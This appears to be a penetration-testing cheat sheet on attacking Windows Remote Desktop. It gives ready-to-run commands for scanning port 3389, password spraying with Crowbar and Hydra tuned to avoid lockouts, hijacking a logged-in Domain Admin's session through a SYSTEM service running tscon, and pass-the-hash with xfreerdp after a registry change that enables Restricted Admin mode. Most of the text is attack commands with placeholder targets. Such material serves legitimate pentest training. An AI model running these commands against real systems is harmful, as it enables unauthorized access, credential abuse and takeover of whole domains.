### RDP Enumeration and Initial Access

The **Remote Desktop Protocol (RDP)** typically operates on **TCP port 3389**. It is a primary target for administrative access and lateral movement.

#### Service Identification

Use **Nmap** to confirm the service is reachable before attempting credential-based attacks.

|Parameter|Description|
|:--|:--|
|`-Pn`|Disable host discovery|
|`-p3389`|Target the default RDP port|

```
nmap -Pn -p3389 <TARGET_IP>
```

#### Password Spraying

**Scenario:** Use when you have a list of potential usernames but no passwords. This technique attempts a single password against many users to avoid **account lockout policies**.

1. **Crowbar:** Effective for bulk RDP credential testing.

```
crowbar -b rdp -s <TARGET_IP>/32 -U <USER_FILE> -c '<PASSWORD>'
```

2. **Hydra:** A versatile alternative, though RDP modules may require stability flags.

```
hydra -L <USER_FILE> -p '<PASSWORD>' <TARGET_IP> rdp
```

**Operational Note:** RDP servers often struggle with high concurrency. Use `-t 1` or `-t 4` in Hydra to limit parallel connections and `-W 1` to prevent service instability.

---

### Establishing a GUI Session

If plaintext credentials are known, use a desktop client to gain full graphical control.

```
rdesktop -u <USERNAME> -p <PASSWORD> <TARGET_IP>
```

---

### RDP Session Hijacking

**Scenario:** Use when you have gained **local administrator** access on a machine where a high-privilege user (e.g., Domain Admin) is currently logged in via RDP. This allows you to impersonate the user without knowing their password.

**Requirements:**

- **Local Administrator** privileges (to transition to SYSTEM).
- **SYSTEM** privileges (required by `tscon.exe`).

#### Operational Workflow

1. **Identify Active Sessions:** List users to find the target `SESSION_ID` and your own `SESSION_NAME`.
    
    ```
    query user
    ```
    
2. **Create a Hijack Service:** Since `sc.exe` runs as **Local System** by default, use it to execute the hijack command.
    
    ```
    sc.exe create <SERVICE_NAME> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
    ```
    
3. **Execute Privilege Escalation:** Start the service to trigger the session swap.
    
    ```
    net start <SERVICE_NAME>
    ```
    

**Attack Implications:** Successful hijacking can result in full domain compromise if a Domain Admin session is targeted. **Edge Case:** This specific method is ineffective on **Windows Server 2019**.

---

### RDP Pass-the-Hash (PtH)

**Scenario:** Use when you have retrieved an **NTLM hash** (e.g., from the SAM database) but cannot crack it to find the plaintext password, yet still require GUI access.

#### Required Registry Modification

The target must have **Restricted Admin Mode** enabled. If it is disabled, you can manually add the registry key if you have sufficient local permissions.

|Key Path|Value Name|Type|Data|
|:--|:--|:--|:--|
|`HKLM\System\CurrentControlSet\Control\Lsa`|`DisableRestrictedAdmin`|`REG_DWORD`|`0x0`|

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Authentication

Once the registry is configured, use **xfreerdp** with the `/pth` flag to authenticate using the hash.

```
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<NTLM_HASH>
```

---

### Vulnerabilities and Misconfigurations

| Condition                          | Risk                                                                                |
| :--------------------------------- | :---------------------------------------------------------------------------------- |
| **Missing Password**               | Rarely, misconfigurations allow RDP access without any credentials.                 |
| **DisableRestrictedAdmin = 0**     | Enables attackers to use Pass-the-Hash for RDP GUI access.                          |
| **Active High-Privilege Sessions** | Allows local admins to hijack sessions via `tscon.exe` to escalate to Domain Admin. |